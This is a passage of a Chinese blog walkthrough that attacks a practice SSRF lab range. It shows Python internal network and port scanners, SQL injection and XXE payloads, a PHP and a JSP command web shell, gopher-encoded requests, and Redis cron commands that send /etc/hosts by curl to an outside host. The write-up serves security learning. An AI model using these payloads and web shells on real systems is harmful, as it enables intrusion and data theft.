class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.24</span><br><br>  <span class="hljs-attr">ssrfweb5:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v5</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.25</span><br><br>  <span class="hljs-attr">ssrfweb6:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v6</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.26</span><br><br>  <span class="hljs-attr">ssrfweb7:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v7</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.27</span><br><br></code></pre></td></tr></table></figure>
+
+<p>进入站点是一个爬虫网站，我们输入百度试试</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161712436.png" srcset="/img/loading.gif" lazyload alt="image-20250408161712436"></p>
+<p>可以回显，试着读取文件</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161811463.png" srcset="/img/loading.gif" lazyload alt="image-20250408161811463"></p>
+<p>ok也是可以的，那我们读取首页文件看看</p>
+<p><code>file:///var/www/html/index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>很标准的SSRF请求</p>
+<p>接下来我们读取hosts文件看看</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408162647474.png" srcset="/img/loading.gif" lazyload alt="image-20250408162647474"></p>
+<p>知道这台机器是<code>172.16.0.21</code>我们借助<code>dict</code>协议扫下网段</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>alive_ips = []<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    ip = <span class="hljs-string">&quot;172.16.0.&quot;</span> + <span class="hljs-built_in">str</span>(i)<br>    <span class="hljs-keyword">try</span>:<br>        r = requests.post(url,headers=header, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;dict://<span class="hljs-subst">&#123;ip&#125;</span>/&quot;</span>&#125;, timeout=<span class="hljs-number">1.5</span>)<br>        <span class="hljs-built_in">print</span>(ip + <span class="hljs-string">&quot;存活&quot;</span>)<br>        alive_ips.append(ip)<br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-built_in">print</span>(ip + <span class="hljs-string">&quot;未存活&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-keyword">for</span> idx, ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alive_ips, <span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>. <span class="hljs-subst">&#123;ip&#125;</span>存活&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">172.16.0.1</span>存活<br><span class="hljs-attribute">2</span>. <span class="hljs-number">172.16.0.21</span>存活<br><span class="hljs-attribute">3</span>. <span class="hljs-number">172.16.0.22</span>存活<br><span class="hljs-attribute">4</span>. <span class="hljs-number">172.16.0.23</span>存活<br><span class="hljs-attribute">5</span>. <span class="hljs-number">172.16.0.24</span>存活<br><span class="hljs-attribute">6</span>. <span class="hljs-number">172.16.0.25</span>存活<br><span class="hljs-attribute">7</span>. <span class="hljs-number">172.16.0.26</span>存活<br><span class="hljs-attribute">8</span>. <span class="hljs-number">172.16.0.27</span>存活<br></code></pre></td></tr></table></figure>
+
+<p><code>172.16.0.1</code>是不算,在扫描其他的端口情况</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>alive_ips = [<br>    <span class="hljs-string">&quot;172.16.0.21&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.22&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.23&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.24&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.25&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.26&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.27&quot;</span>,<br>]<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br>common_ports = [<br>    <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>, <span class="hljs-number">53</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">80</span>, <span class="hljs-number">110</span>, <span class="hljs-number">143</span>, <span class="hljs-number">443</span>,<br>    <span class="hljs-number">8080</span>, <span class="hljs-number">3306</span>, <span class="hljs-number">5432</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">27017</span>, <span class="hljs-number">5900</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">8000</span>, <span class="hljs-number">8888</span>,<br>    <span class="hljs-number">2049</span>, <span class="hljs-number">514</span>, <span class="hljs-number">1194</span>, <span class="hljs-number">9100</span>, <span class="hljs-number">139</span>, <span class="hljs-number">445</span>, <span class="hljs-number">161</span>, <span class="hljs-number">162</span>, <span class="hljs-number">3389</span>, <span class="hljs-number">1521</span>,<br>    <span class="hljs-number">3128</span><br>]<br><br>results = []<br><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> alive_ips.copy():<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> common_ports:<br>        target = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span><br>        r = requests.post(<br>            url,<br>            data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;dict://<span class="hljs-subst">&#123;target&#125;</span>/&quot;</span>&#125;,<br>        )<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;HTTP/1.1&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;target&#125;</span> 服务存活&quot;</span>)<br>            results.append(target)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;target&#125;</span> 服务不存活&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-comment"># 打印最终结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n======= 存活服务列表 =======&quot;</span>)<br><span class="hljs-keyword">for</span> idx, result <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(results, <span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>. <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><br><br></code></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">172.16.0.21:80</span><br><span class="hljs-attribute">2</span>. <span class="hljs-number">172.16.0.22:80</span><br><span class="hljs-attribute">3</span>. <span class="hljs-number">172.16.0.23:80</span><br><span class="hljs-attribute">4</span>. <span class="hljs-number">172.16.0.24:80</span><br><span class="hljs-attribute">5</span>. <span class="hljs-number">172.16.0.25:80</span><br><span class="hljs-attribute">6</span>. <span class="hljs-number">172.16.0.26:8080</span><br><span class="hljs-attribute">7</span>. <span class="hljs-number">172.16.0.27:6379</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="172-16-0-21"><a href="#172-16-0-21" class="headerlink" title="172.16.0.21"></a>172.16.0.21</h2><p>主站点使用<code>file:///etc/hosts</code>直接拿下</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408173918386.png" srcset="/img/loading.gif" lazyload alt="image-20250408173918386"></p>
+<h2 id="172-16-0-22"><a href="#172-16-0-22" class="headerlink" title="172.16.0.22"></a>172.16.0.22</h2><p>使用脚本扫描站点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;字典&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> f:<br>            payload = <span class="hljs-string">f&quot;http://172.16.0.22/<span class="hljs-subst">&#123;a.strip()&#125;</span>&quot;</span><br>            r = requests.post(url, headers=header, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span>&#125;)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;not found&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(payload+<span class="hljs-string">&quot;存在&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.22/shell.php存在</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.22/phpinfo.php存在</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408175815246.png" srcset="/img/loading.gif" lazyload alt="image-20250408175815246"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>直接rce</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408180118005.png" srcset="/img/loading.gif" lazyload alt="image-20250408180118005"></p>
+<p>拿下</p>
+<h2 id="172-16-0-23"><a href="#172-16-0-23" class="headerlink" title="172.16.0.23"></a>172.16.0.23</h2><p>扫描结果:</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.23/index.php存在</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221700376.png" srcset="/img/loading.gif" lazyload alt="image-20250408221700376"></p>
+<p>sql注入，没有任何的过滤，我们直接打</p>
+<p>测试发现有四个字段：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.0.23</span>/?id=-<span class="hljs-number">1</span>&#x27;union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>--+<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221908874.png" srcset="/img/loading.gif" lazyload alt="image-20250408221908874"></p>
+<p>回显是4,我们直接加载文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.0.23</span>/?id=-<span class="hljs-number">1</span>&#x27;union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,load_file(&#x27;/etc/hosts&#x27;)--+<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408222002410.png" srcset="/img/loading.gif" lazyload alt="image-20250408222002410"></p>
+<h2 id="172-16-0-24"><a href="#172-16-0-24" class="headerlink" title="172.16.0.24"></a>172.16.0.24</h2><p>后面的靶场均使用代理出来正常打，在转化为SSRF打法</p>
+<p>扫描结果:</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.25/index.php存在</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224712188.png" srcset="/img/loading.gif" lazyload alt="image-20250408224712188"></p>
+<h3 id="正常打法"><a href="#正常打法" class="headerlink" title="正常打法"></a>正常打法</h3><p>很经典的截断RCE</p>
+<p>post上传：</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224839796.png" srcset="/img/loading.gif" lazyload alt="image-20250408224839796"></p>
+<h3 id="SSRF打法"><a href="#SSRF打法" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>把正常打法的整个数据包二次URL编码</p>
+<p>注意点:</p>
+<ul>
+<li><code>Accept-Encoding: gzip, deflate</code>把这行删除，不然会出现乱码，因为被两次gzip编码了，</li>
+<li>需要抓一个正常的POST包，然后自己把<code>host</code>等类似的东西改掉，然后全选进行全编码(Convert selection-&gt;URL-&gt;URL-encode all characters )</li>
+</ul>
+<p>利用gopher协议打</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225016798.png" srcset="/img/loading.gif" lazyload alt="image-20250408225016798"></p>
+<h2 id="172-16-0-25"><a href="#172-16-0-25" class="headerlink" title="172.16.0.25"></a>172.16.0.25</h2><p>扫描结果:</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.25/index.php存在</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="正常打法-1"><a href="#正常打法-1" class="headerlink" title="正常打法"></a>正常打法</h3><p>随便上传抓包试试</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225308832.png" srcset="/img/loading.gif" lazyload alt="image-20250408225308832"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225323772.png" srcset="/img/loading.gif" lazyload alt="image-20250408225323772"></p>
+<p>用户登录xml文档解析的</p>
+<p>我们直接打XXE</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">demo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功RCE</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408231953379.png" srcset="/img/loading.gif" lazyload alt="image-20250408231953379"></p>
+<h3 id="SSRF打法-1"><a href="#SSRF打法-1" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>把正常打的整个数据包二次url编码，打gopher协议</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.16.0.25:80/_2次编码后的tcp流</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408232051621.png" srcset="/img/loading.gif" lazyload alt="image-20250408232051621"></p>
+<h2 id="172-16-0-26"><a href="#172-16-0-26" class="headerlink" title="172.16.0.26"></a>172.16.0.26</h2><p>场景是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞，这在 Tomcat 漏洞历史中也是比较经典第一个</p>
+<h3 id="正常打法-2"><a href="#正常打法-2" class="headerlink" title="正常打法"></a>正常打法</h3><p>PUT文件上传：</p>
+<p>上传jsp马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span>(command != <span class="hljs-literal">null</span>)<br>    &#123;<br>        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)<br>        &#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        out.print(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110428160.png" srcset="/img/loading.gif" lazyload alt="image-20250409110428160"></p>
+<p>正常访问木马</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110450918.png" srcset="/img/loading.gif" lazyload alt="image-20250409110450918"></p>
+<h3 id="SSRF打法-2"><a href="#SSRF打法-2" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>把正常传马的数据包2次url编码使用gopher协议上传</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111321133.png" srcset="/img/loading.gif" lazyload alt="image-20250409111321133"></p>
+<p>把访问马的数据包同意操作或者使用http协议访问</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112148831.png" srcset="/img/loading.gif" lazyload alt="image-20250409112148831"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111432179.png" srcset="/img/loading.gif" lazyload alt="image-20250409111432179"></p>
+<h2 id="172-16-0-27"><a href="#172-16-0-27" class="headerlink" title="172.16.0.27"></a>172.16.0.27</h2><h3 id="正常打法-3"><a href="#正常打法-3" class="headerlink" title="正常打法"></a>正常打法</h3><p>代理出来使用工具连接执行命令</p>
+<h3 id="SSRF打法-3"><a href="#SSRF打法-3" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>端口扫描的是6379存活，使用dict协议看看是什么</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112307716.png" srcset="/img/loading.gif" lazyload alt="image-20250409112307716"></p>
+<p>是redis数据库而且未授权</p>
+<p>系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以打算定时任务</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 清空 key</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/flushall<br><br><span class="hljs-comment"># 设置要操作的路径为定时任务目录</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/config <span class="hljs-keyword">set</span> dir <span class="hljs-string">/var/spool/cron/</span><br><br><span class="hljs-comment"># 在定时任务目录下创建 root 的定时任务文件</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/config <span class="hljs-keyword">set</span> dbfilename root<br><br><span class="hljs-comment"># 外带/etc/hosts文件</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/<span class="hljs-keyword">set</span> x &#x27;\n* * * * * curl <span class="hljs-params">--get</span> <span class="hljs-params">--data-urlencode</span> <span class="hljs-string">&quot;f=$(cat /etc/hosts)&quot;</span> <span class="hljs-string">&quot;http://ip:32777&quot;</span>\n&#x27;<br><br><span class="hljs-comment"># 保存上述操作</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/save<br><br></code></pre></td></tr></table></figure>
+
+<p>但是不知道为什么一连上就掉了</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409122659944.png" srcset="/img/loading.gif" lazyload alt="image-20250409122659944"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="category-chain-item">知识点</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
+      
+        <a href="/tags/ssrf/" class="print-no-link">#ssrf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SSRF深入剖析+国光SSRF靶场攻克</div>
+      <div>https://tuyiisxp.github.io/2025/04/07/SSRF深入剖析-国光SSRF靶场攻克/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>tuyi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月7日</div>
+        </div>
